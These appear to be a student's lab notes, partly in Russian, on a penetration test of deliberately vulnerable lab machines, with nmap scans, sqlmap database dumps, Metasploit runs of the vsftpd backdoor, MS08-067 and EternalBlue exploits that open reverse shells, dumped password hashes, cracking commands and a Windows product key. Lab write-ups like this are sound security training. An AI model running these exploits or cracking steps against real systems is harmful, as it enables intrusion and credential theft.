# ЛР6

## nmap
```
# scanning for open ports
nmap -p- -O -sV 192.168.37.1/24
-----------------------------------------------------------------------------------
## nmap-vulscan

# installation
cd /usr/share/nmap/scripts/
git clone https://github.com/scipag/vulscan.git
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan 
cd vulscan/utilities/updater/
chmod +x updateFiles.sh
./updateFiles.sh
-----------------------------------------------------------------------------------
# scanning vuln
nmap -sV --script vuln 192.168.37.104
-----------------------------------------------------------------------------------
# scanning cve
nmap --script vulscan/ --script-args vulscandb=cve.csv -sV -oN 101.txt $IP
-----------------------------------------------------------------------------------
# enumerate users
nmap -script smb-enum-users.nse -p 445 192.168.37.101
-----------------------------------------------------------------------------------
# enumerate auth methods supported
nmap --script ssh-auth-methods $IP
```

## metasploitable
* Link download metasploitable VM `https://sourceforge.net/projects/metasploitable/`
* Metasploitable/SSH/Exploits
`https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits`

* Metasploitable/NFS
`https://charlesreid1.com/wiki/Metasploitable/NFS`

* How to add a module to Metasploit from Exploit-DB
`https://kalinull.medium.com/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d`

* The best Beginner guide to hacking Metasploitable2 with Kali Linux
`https://www.youtube.com/playlist?list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs`

* Vulnhub — Kiopitrix Level 1.2(#3) Write Up
`https://medium.com/@tnvo/vulnhub-kiopitrix-level-1-2-3-write-up-7147476d5efa`

### Opening ports
```                                          
PORT      STATE SERVICE     VERSION                                                          
21/tcp    open  ftp         vsftpd 2.3.4                                                     
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                     
23/tcp    open  telnet      Linux telnetd                                                    
25/tcp    open  smtp        Postfix smtpd                                                    
53/tcp    open  domain      ISC BIND 9.4.2                                                   
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)                              
111/tcp   open  rpcbind     2 (RPC #100000)                                                  
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
38446/tcp open  java-rmi    GNU Classpath grmiregistry
43675/tcp open  status      1 (RPC #100024)
57643/tcp open  mountd      1-3 (RPC #100005)
60712/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:60:20:56 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80 exploitation
```
nikto -h $IP
# find the available databases:
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1" — dbs
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1” -p id — tables -D gallery
# dump all entries in the dev_account table:
sqlmap -u “http://192.168.37.101/gallery/gallery.php?id=1" -p id -T dev_accounts –dump

OR 

http://192.168.37.101
http://192.168.37.101/mutillidae/robots.txt
http://192.168.37.101/mutillidae/passwords
```

### Exploitng Port 21 FTP
```
# run postgresql sever
service postgresql start
# search for version of ftp server
msf6 > search vsftpd 2.3.4 
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.37.101
RHOSTS => 192.168.37.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.37.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.37.101:21 - USER: 331 Please specify the password.
[+] 192.168.37.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.37.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.37.105:45905 -> 192.168.37.101:6200) at 2022-11-24 20:44:32 +0300

whoami
root
sudo grep msfadmin /etc/shadow
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
```

## Cracking password
how to HACK a password // password cracking with Kali Linux and HashCat
`https://www.youtube.com/watch?v=z4_oqTZJqCo`

Retrieving passwords using NTLM + cracked LM hashes `https://github.com/ricardojoserf/LM_original_password_cracker`
```
# using hydra for bruteforce-attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 41221
# using hashcat 
sudo hashcat -a 0 -m 500 hashes.txt /usr/share/wordlists/rockyou.txt 
# using john the ripper
# for meta
john --format=md5crypt hashes.txt
# for windows server
john --format=LM 104.txt 

```

## Windows XP
* Link download `https://archive.org/details/WinXPSP2HomeProRUS`
X3WJB-3B2BH-3MPM6-8F6GR-X9HBJ
### Opening ports

```
PORT     STATE    SERVICE         VERSION
110/tcp  filtered pop3
135/tcp  open     msrpc           Microsoft Windows RPC
139/tcp  open     netbios-ssn     Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds    Microsoft Windows XP microsoft-ds
548/tcp  filtered afp
587/tcp  filtered submission
1025/tcp open     msrpc           Microsoft Windows RPC
1029/tcp filtered ms-lsa
1720/tcp filtered h323q931
1723/tcp filtered pptp
2717/tcp filtered pn-requester
5000/tcp open     upnp?
8081/tcp filtered blackice-icecap
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=2%D=11/26%Time=6381DAB9%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(RTSPRequest,1C,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
MAC Address: 00:0C:29:52:71:FE (VMware)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```
## Windows Server 2003
* Link download `https://archive.org/details/WindowsServer2003StandardEditionwithServicePack2x86Russian`

### Opening ports
```
PORT     STATE    SERVICE         VERSION
53/tcp   open     domain          Simple DNS Plus
88/tcp   open     kerberos-sec    Microsoft Windows Kerberos (server time: 2022-11-26 09:22:02Z)
135/tcp  open     msrpc           Microsoft Windows RPC
139/tcp  open     netbios-ssn     Microsoft Windows netbios-ssn
389/tcp  open     ldap            Microsoft Windows Active Directory LDAP (Domain: lab6.local, Site: Default-First-Site)
445/tcp  open     microsoft-ds    Microsoft Windows 2003 or 2008 microsoft-ds
1025/tcp open     msrpc           Microsoft Windows RPC
1027/tcp open     ncacn_http      Microsoft Windows RPC over HTTP 1.0

Service Info: Host: DC-WIN2003; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
```
### Check if smb-vulner
```
nmap --script smb-vuln* -p 137,139,445 192.168.37.104
Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms08-067: 
|   VULNERABLE:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|_smb-vuln-ms10-054: false
```

### Check smb version
```
msf6 > use scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.37.104
RHOSTS => 192.168.37.104
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.37.104:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[+] 192.168.37.104:445    -   Host is running Windows 2003 SP2 (build:3790) (name:ABC-F4E78EACEE7) (workgroup:WORKGROUP)
```

### ms08-067 module
```
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.37.104
RHOSTS => 192.168.37.104
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.37.103
LHOST => 192.168.37.103
msf6 exploit(windows/smb/ms08_067_netapi) > set TARGET 79
TARGET => 79
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
meterpreter > hashdump
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:a678c3c5bab6c7cd2d8f07a65f774322:::
�������������:500:f327719aa33209c30127e6c633058252:d163811087541b61267b389d0a94fed2:::
�����:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### ms17-010 module
Exploit EternalBlue on Windows Server with Metasploit `https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/`

```
# ms17_010_psexec
msf6 > use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                Required  Description
   ----                  ---------------                                --------  -----------
   DBGTRACE              false                                          yes       Show extra debug trace info
   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                         s/named_pipes.txt
   RHOSTS                                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
                                                                                  etasploit
   RPORT                 445                                            yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                 no        The service display name
   SERVICE_NAME                                                         no        The service name
   SHARE                 ADMIN$                                         yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/wri
                                                                                  te folder share
   SMBDomain             .                                              no        The Windows domain to use for authentication
   SMBPass                                                              no        The password for the specified username
   SMBUser                                                              no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload


msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.37.104
RHOSTS => 192.168.37.104
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.37.103
LHOST => 192.168.37.103
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4321
LPORT => 4321
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 192.168.37.103:4321 
[*] 192.168.37.104:445 - Target OS: Windows Server 2003 3790 Service Pack 2
[*] 192.168.37.104:445 - Filling barrel with fish... done
[*] 192.168.37.104:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.37.104:445 -        [*] Preparing dynamite...
[*] 192.168.37.104:445 -                Trying stick 1 (x64)...Miss
[*] 192.168.37.104:445 -                [*] Trying stick 2 (x86)...Boom!
[*] 192.168.37.104:445 -        [+] Successfully Leaked Transaction!
[*] 192.168.37.104:445 -        [+] Successfully caught Fish-in-a-barrel
[*] 192.168.37.104:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 192.168.37.104:445 - Reading from CONNECTION struct at: 0x8783e308
[*] 192.168.37.104:445 - Built a write-what-where primitive...
[+] 192.168.37.104:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.37.104:445 - Selecting native target
[*] 192.168.37.104:445 - Uploading payload... ydmYWLsA.exe
[*] 192.168.37.104:445 - Created \ydmYWLsA.exe...
[+] 192.168.37.104:445 - Service started successfully...
[*] 192.168.37.104:445 - Deleting \ydmYWLsA.exe...
[*] Sending stage (175686 bytes) to 192.168.37.104
[*] Meterpreter session 3 opened (192.168.37.103:4321 -> 192.168.37.104:1033) at 2022-11-28 12:36:30 +0300

meterpreter > 
-----------------------------------------------------------------------------------
# ms17_010_eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.37.104
RHOSTS => 192.168.37.104                                                          
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp                                    
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.37.103         
LHOST => 192.168.37.103                                                           
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4321                   
LPORT => 4321                                                                     
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
```


